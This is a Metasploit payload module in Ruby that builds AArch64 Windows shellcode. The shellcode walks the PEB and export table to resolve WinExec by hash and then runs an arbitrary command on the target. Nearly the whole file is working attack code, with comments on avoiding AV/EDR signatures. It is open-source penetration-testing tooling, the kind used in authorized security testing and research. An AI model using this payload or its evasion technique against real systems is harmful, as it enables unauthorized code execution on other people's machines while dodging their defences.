##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  # This size is an approximation. The final size depends on the CMD string.
  CachedSize = 352

  include Msf::Payload::Windows
  include Msf::Payload::Single

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows AArch64 Command Execution',
        'Description' => %q{
          Executes an arbitrary command on a Windows on ARM (AArch64) target.
          This payload is a foundational example of position-independent shellcode for the AArch64 architecture.
          It dynamically resolves the address of the `WinExec` function from `kernel32.dll` by parsing the
          Process Environment Block (PEB) and the module's Export Address Table (EAT) at runtime.
          This technique avoids static imports and hardcoded function addresses, increasing resilience.
        },
        'Author' => [
          'alanfoster', # Original implementation and research
          'Alexander "xaitax" Hagenah' # Refactoring, Improvements and Optimization
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_AARCH64,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, SCREEN_EFFECTS]
        }
      )
    )

    register_options(
      [
        OptString.new('CMD', [true, 'The command string to execute', 'calc.exe'])
      ]
    )
  end

  def generate(_opts = {})
    # The following AArch64 assembly implements the payload's core logic.
    # It is based on the alanfosters original implementation.
    cmd_str = datastore['CMD'] || 'calc.exe'
    asm = <<~EOF
      // AArch64 Windows PIC Shellcode
      // -----------------------------
      // Key Registers:
      // x0-x7: Arguments to functions and return values.
      // x18:   Pointer to the Thread Environment Block (TEB) in user mode.
      // x29:   Frame Pointer (FP).
      // x30:   Link Register (LR), holds the return address for function calls.

      main:
          // --- Function Prologue ---
          // Establishes a stack frame according to the AArch64 ABI.
          // Allocate 0xb0 (176) bytes on the stack for local variables, saved registers, and scratch space.
          // Then store the caller's frame pointer (x29) and link register (x30) at the new stack top.
          stp     x29, x30, [sp, #-0xb0]!
          // Set our new frame pointer to the current stack pointer.
          mov     x29, sp
          // Save non-volatile registers (x19-x21) that we will modify.
          stp     x19, x20, [x29, #0x10]
          str     x21, [x29, #0x20]

          // --- API Hash Setup ---
          // Load the pre-calculated hash for kernel32.dll!WinExec into register w8.
          // Hashing avoids using literal strings ("WinExec") in the payload, which are
          // common signatures for AV/EDR.
          movz w8, #0x8b31
          movk w8, #0x876f, lsl #16

      api_call:
          // --- PEB Traversal ---
          // This section finds the base address of loaded modules (DLLs) in a
          // position-independent way by walking structures internal to the process.
          // x18 on Windows AArch64 always points to the Thread Environment Block (TEB).
          ldr x10, [x18, #0x60]      // x10 = TEB->ProcessEnvironmentBlock (PEB)
          ldr x10, [x10, #0x18]      // x10 = PEB->Ldr
          ldr x10, [x10, #0x20]      // x10 = PEB->Ldr.InMemoryOrderModuleList.Flink (points to first module entry)

      next_mod:
          // --- Module Name Hashing ---
          // For each module, calculate a hash of its name to find kernel32.dll.
          ldr x11, [x10, #0x50]      // x11 = LDR_DATA_TABLE_ENTRY->FullDllName.Buffer pointer
          ldr x12, [x10, #0x4a]      // x12 = LDR_DATA_TABLE_ENTRY->FullDllName.Length (USHORT)
          and x12, x12, #0xffff      // Ensure we only have the 16-bit length
          movz w13, #0               // w13 = module hash accumulator, zero it out.
      loop_modname:
          // This hashing loop reads one byte at a time from the UTF-16 DLL name.
          // It only uses the ASCII part for hashing and handles case-insensitivity.
          ldrb w14, [x11], #1        // Read a byte and post-increment the pointer
          cmp w14, #97               // Compare with ASCII 'a'
          b.lt not_lowercase
          sub w14, w14, #0x20        // If lowercase, convert to uppercase
      not_lowercase:
          ror w13, w13, #13          // Rotate the hash accumulator right by 13 bits
          add w13, w13, w14          // Add the character's byte value to the hash
          sub w12, w12, #1           // Decrement length counter
          cmp w12, wzr
          b.gt loop_modname
          // These extra rotates are preserved from the original implementation to match the target hash.
          ror w13, w13, #13
          ror w13, w13, #13

          // Save the current module's context (its LDR_DATA_TABLE_ENTRY pointer and its computed hash)
          // to our stack frame before we start parsing its export table.
          str x10, [x29, #0x30]
          str w13, [x29, #0x38]

          // --- PE Export Table Traversal ---
          ldr x10, [x10, #0x20]      // x10 = DllBase (the module's base memory address)
          ldr w11, [x10, #0x3c]      // Get e_lfanew offset from the DOS header
          add x11, x10, x11          // x11 = Address of the main PE (NT) Header

          // --- PE64 Magic Number Check ---
          // This check is a critical robustness feature. It ensures we only attempt to parse
          // 64-bit PE modules, avoiding crashes if a 32-bit (WoW64) module is encountered.
          // The PE32+ Magic (0x020B) is at Optional Header +0x18.
          ldrh w14, [x11, #0x18]     // Load the Magic number from the Optional Header
          cmp w14, #0x020b           // Compare with the PE32+ magic value for 64-bit
          b.ne get_next_mod_loop     // If it's not a 64-bit module, skip it.

          ldr w11, [x11, #0x88]      // Get Export Address Table (EAT) RVA from Optional Header
          cmp x11, #0
          b.eq get_next_mod_loop     // If there's no EAT, skip this module.
          add x11, x11, x10          // x11 = EAT Virtual Address
          str x11, [x29, #0x40]      // Save EAT address to the stack
          ldr w12, [x11, #0x18]      // w12 = EAT.NumberOfNames
          ldr w13, [x11, #0x20]      // w13 = EAT.AddressOfNames RVA
          add x13, x10, x13          // w13 = EAT.AddressOfNames Virtual Address

      get_next_func:
          // --- Function Name Hashing ---
          // Loop through all function names in the EAT.
          cmp w12, #0
          b.eq get_next_mod_loop     // If all function names checked, move to the next module.
          sub w12, w12, #1           // Decrement function counter (we search backwards)
          mov x14, #4
          madd x15, x12, x14, x13    // Calculate address of the current function name's RVA in the name array
          ldr w15, [x15]             // Get the RVA of the function name string
          add x15, x10, x15          // x15 = VA of the function name string
          movz x5, #0                // w5 = function hash accumulator, zero it out.
      loop_funcname:
          ldrb w11, [x15], #1        // Load one byte of the ASCII function name
          ror w5, w5, #13
          add w5, w5, w11
          cmp x11, #0
          b.ne loop_funcname         // Loop until the null terminator is hit.
      funcname_hashed:
          ldr w6, [x29, #0x38]       // Retrieve the saved module hash from our stack frame
          add w6, w6, w5             // Combined hash = module_hash + function_hash
          cmp w6, w8                 // Does this match our target hash (kernel32.dll!WinExec)?
          b.ne get_next_func         // If not, hash the next function name.

      // --- Function Address Resolution ---
      // We found the correct function name. Now, we find its actual address.
      found_func:
          ldr x11, [x29, #0x40]      // Restore EAT address from stack
          ldr w13, [x11, #0x24]      // Get EAT.AddressOfNameOrdinals RVA
          add x13, x10, x13          // VA of the ordinal table
          mov x14, #2
          madd x15, x12, x14, x13    // Get address of our function's ordinal
          ldrh w15, [x15]            // Get the 16-bit ordinal value
          ldr w13, [x11, #0x1c]      // Get EAT.AddressOfFunctions RVA
          add x13, x10, x13          // VA of the function address table
          mov x14, #4
          madd x15, x15, x14, x13    // Get address of the function's RVA from the address table using the ordinal
          ldr w15, [x15]             // Get the function's RVA
          add x15, x15, x10          // x15 = Final Virtual Address of WinExec

      finish:
          // --- Call WinExec ---
          // Set up x9 to point to a scratch buffer on our stack.
          add x9, x29, #0x50
          // create_aarch64_string_in_stack will write the command string to the
          // address in x9 and place the final pointer to the string in x0.
          #{create_aarch64_string_in_stack(cmd_str)}
          mov w1, #1                 // Arg2 (uCmdShow) = SW_SHOWNORMAL (1) - Makes the new window visible.
          mov x8, x15                // Move target function address into a volatile register for the call.
          blr x8                     // Branch with Link to Register (call WinExec).

      // --- Function Epilogue ---
      // Cleanly tears down the stack frame and returns execution to the caller.
      epilogue:
          // Restore saved non-volatile registers from the stack frame.
          ldp     x19, x20, [x29, #0x10]
          ldr     x21, [x29, #0x20]
          // Restore the original stack pointer.
          mov     sp, x29
          // Restore the caller's frame pointer and link register, deallocating our stack frame in one instruction.
          ldp     x29, x30, [sp], #0xb0
          ret                        // Return to the address stored in the Link Register.

      // --- Loop Control for Module Iteration ---
      get_next_mod_loop:
          // Restore the LDR_DATA_TABLE_ENTRY pointer from the stack.
          ldr x10, [x29, #0x30]
          // The InMemoryOrderModuleList is a circular doubly-linked list.
          // Following the Flink pointer gets the next module in the list.
          ldr x10, [x10]
          // Jump back to begin processing this next module.
          b next_mod
    EOF

    compile_aarch64(asm)
  end

  # Generates AArch64 assembly to write a given string to the stack and return a pointer to it.
  # This is a classic shellcode technique to create strings in memory at runtime.
  # @param string [String] The string to be placed on the stack.
  # @return [String] A block of AArch64 assembly code.
  def create_aarch64_string_in_stack(string)
    str = string + "\x00"
    target = :x0 # The pointer to the string will be returned in x0 (first argument register).
    stack = :x9  # x9 is used as a temporary pointer to write the string to the stack.

    # Build the string 8 bytes at a time.
    push_string = str.bytes.each_slice(8).flat_map do |chunk|
      # Load the 8-byte chunk into the target register using a sequence of movz/movk.
      mov_instructions = chunk.each_slice(2).with_index.map do |word, idx|
        # NOTE: Chunks are reversed to build the little-endian value correctly in the register.
        hex = word.reverse.map { |b| format('%02x', b) }.join
        "mov#{idx == 0 ? 'z' : 'k'} #{target}, #0x#{hex}#{idx == 0 ? '' : ", lsl ##{idx * 16}"}"
      end
      # Store the 8-byte value from the register onto the stack and advance the stack pointer.
      [*mov_instructions, "str #{target}, [#{stack}], #8"]
    end

    # After writing, `stack` points just past the end of the string.
    # We subtract the aligned size to get the pointer to the beginning of the string.
    set_target_register = [
      "mov #{target}, #{stack}",
      "sub #{target}, #{target}, ##{align(str.bytesize)}"
    ]
    (push_string + set_target_register).join("\n")
  end

  # Aligns a given value to a specified boundary (defaults to 8 bytes).
  # @param value [Integer] The value to align.
  # @param alignment [Integer] The alignment boundary.
  # @return [Integer] The aligned value.
  def align(value, alignment: 8)
    return value if (value % alignment).zero?

    value + (alignment - (value % alignment))
  end

  # Compiles a string of AArch64 assembly into raw binary shellcode.
  # @param asm_string [String] The assembly code.
  # @return [String] The compiled binary shellcode.
  def compile_aarch64(asm_string)
    # This requires the 'aarch64' gem.
    require 'aarch64/parser'
    parser = ::AArch64::Parser.new
    asm = parser.parse(without_inline_comments(asm_string))
    asm.to_binary
  end

  # Removes all inline comments from an assembly string, as the aarch64
  # gem parser does not support them.
  # @param string [String] The assembly code with comments.
  # @return [String] The assembly code without comments.
  def without_inline_comments(string)
    string.lines.map { |line| line.split('//', 2).first.strip }.reject(&:empty?).join("\n")
  end
end
